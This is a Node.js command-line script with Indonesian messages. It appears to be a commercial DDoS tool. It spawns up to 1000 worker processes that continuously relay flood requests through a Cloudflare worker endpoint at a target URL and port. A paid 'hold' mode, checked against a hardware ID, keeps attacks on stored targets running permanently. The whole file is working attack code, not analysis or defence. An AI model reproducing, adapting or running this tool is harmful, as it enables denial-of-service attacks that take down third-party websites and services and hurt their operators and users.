const http = require('https');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const readline = require('readline');

const STORAGE = 'storage.json';
const WORKER_HOST = 'ini.pemicudos.workers.dev'; 
const WORKER_PROTECT = 'antiddos.habib-gem501.workers.dev'; 
const UID = crypto.createHash('md5').update(os.hostname() + os.userInfo().username).digest('hex');

const DEFAULT_API_URL = 'https://gist.githubusercontent.com/GMhabib/5d1cfc680d015396046dbbab8fb34000/raw/license.json';
const API_URL = process.env.API_GIST_URL || DEFAULT_API_URL;

const ask = (question) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(question, (answer) => {
        rl.close();
        resolve(answer.trim());
    }));
};

async function checkEndpointHealth() {
    console.log(`[!] Mengecek status worker: ${WORKER_HOST}...`);
    return new Promise((resolve) => {
        http.get(`https://${WORKER_HOST}`, (res) => {
            console.log(`Status Code: ${res.statusCode}`);
            if (res.statusCode >= 200 && res.statusCode < 400) {
                console.log("Status: Worker Online.");
            } else if (res.statusCode === 429) {
                console.log("Status: Cloudflare limit.");
                process.exit(1);
            } else {
                console.log("Status: Worker Aktif.");
            }
            resolve();
        }).on('error', (e) => {
            console.error("Gagal terhubung ke endpoint worker:", e.message);
            resolve();
        });
    });
}

function checkLicense() {
    return new Promise((resolve) => {
        let targetUrl = API_URL.trim();
        if (targetUrl.includes('github.com') && !targetUrl.includes('/raw/')) {
            targetUrl = targetUrl.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/');
        }
        
        targetUrl += (targetUrl.includes('?') ? '&' : '?') + 't=' + Date.now();

        http.get(targetUrl, (res) => {
            let data = '';
            res.on('data', (c) => data += c);
            res.on('end', () => {
                try {
                    if (data.trim().startsWith('<')) {
                        resolve(false);
                        return;
                    }
                    const db = JSON.parse(data);
                    const expiry = db[UID];
                    if (expiry && new Date(expiry) > new Date()) {
                        resolve(true); 
                    } else {
                        resolve(false); 
                    }
                } catch (e) {
                    resolve(false);
                }
            });
        }).on('error', () => resolve(false));
    });
}

function getStorage() {
    return fs.existsSync(STORAGE) ? JSON.parse(fs.readFileSync(STORAGE)) : [];
}

if (cluster.isMaster) {
    (async () => {
        let args = process.argv.slice(2);
        let command, url, port, duration, threadCount;

        if (args.length === 4) {
            url = args[0];
            port = args[1];
            duration = args[2];
            threadCount = args[3];
            command = duration;
        } else {
            command = args[0];
            url = args[1];
            port = args[2];
            duration = args[3];
            threadCount = args[4];
        }

        if (command === 'cfstatus') {
            await checkEndpointHealth();
            process.exit();
        }

        if (!command || !url) {
            console.log(`
           %% %%
    %%%    %#+*%%   %%%
     %%%  %%%%%%%  %%%%
       %%%%%%%%%%%%%%%
        #%%%%%%%%%%
  #%%%%%%%%%%+#%%%%%%%%%%
        %%%%#=*%%%%
     %%%%%%%#=*%%%%%%%
    %%%%  %%#=*%%   %%%
    %%               %%`);
            console.log("=== Mode Interaktif ===");
            await checkEndpointHealth();
            url = await ask('Masukkan URL: ');
            port = await ask('Masukkan Port: ');
            duration = await ask('Masukkan Detik (atau "hold"): ');
            threadCount = await ask('Masukkan Thread: ');
            command = duration;
        }

        if (command === 'status') {
            const data = getStorage();
            console.log('--- Target yang sedang di-Hold ---');
            data.forEach((item, i) => console.log(`${i+1}. ${item.url} | Thread: ${item.threads}`));
            const hapus = await ask('Apakah anda ingin menghapusnya? (y/n): ');
            if (hapus.toLowerCase() === 'y') {
                fs.writeFileSync(STORAGE, JSON.stringify([]));
                console.log('Semua target telah dihapus.');
            }
            process.exit();
        }

        if (command === 'deleted') {
            fs.writeFileSync(STORAGE, JSON.stringify([]));
            console.log('Semua target telah dihapus.');
            process.exit();
        }

        if (!url || !port || !duration || !threadCount) {
            console.log('Usage: node p.js <url> <port> <detik/hold> <thread>');
            process.exit(1);
        }

        const threads = parseInt(threadCount);
        if (threads < 50 || threads > 1000) {
            console.log(`[!] Error: Jumlah thread harus di antara 50 dan 1000.`);
            process.exit(1);
        }

        if (duration === 'hold') {
            const isPremium = await checkLicense();
            if (!isPremium) {
                console.log(`[!] Fitur "Hold" memerlukan akses Premium. ID Hardware: ${UID}`);
                process.exit();
            }
            const data = getStorage();
            // Cek agar tidak duplikat di storage
            if (!data.some(item => item.url === url)) {
                data.push({ url, threads: threadCount });
                fs.writeFileSync(STORAGE, JSON.stringify(data));
            }
            console.log(`[+] Target ${url} berhasil di-Hold dan dijalankan permanen!`);
        } else {
            let sisaDetik = parseInt(duration);
            const interval = setInterval(() => {
                process.stdout.write(`\r[!] Berjalan selama: ${sisaDetik} detik...`);
                if (sisaDetik <= 0) {
                    console.log('\n[!] Waktu habis, memberhentikan proses...');
                    http.get(`https://${WORKER_HOST}/?action=stop`, () => {
                        process.exit();
                    }).on('error', () => process.exit());
                }
                sisaDetik--;
            }, 1000);
        }

        console.log(`Menjalankan ${threadCount} thread ke ${url} via worker ${WORKER_HOST}...`);
        for (let i = 0; i < threads; i++) {
            cluster.fork({ TARGET_URL: url, PORT: port, DURATION: duration, WORKER_HOST: WORKER_HOST });
        }
    })();
} else {
    const { TARGET_URL, PORT, DURATION, WORKER_HOST } = process.env;
    const isHold = DURATION === 'hold';
    const startTime = Date.now();

    function sendToWorker() {
        if (!isHold && (Date.now() - startTime) > (parseInt(DURATION) * 1000)) {
            process.exit();
        }

        const targetFull = encodeURIComponent(`${TARGET_URL}:${PORT}`);
        const workerPath = `/?target=${targetFull}`;

        const options = {
            hostname: WORKER_HOST,
            path: workerPath,
            method: 'GET'
        };

        const req = http.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => setTimeout(sendToWorker, 10));
        });

        req.on('error', () => setTimeout(sendToWorker, 100));
        req.end();
    }
    sendToWorker();
}
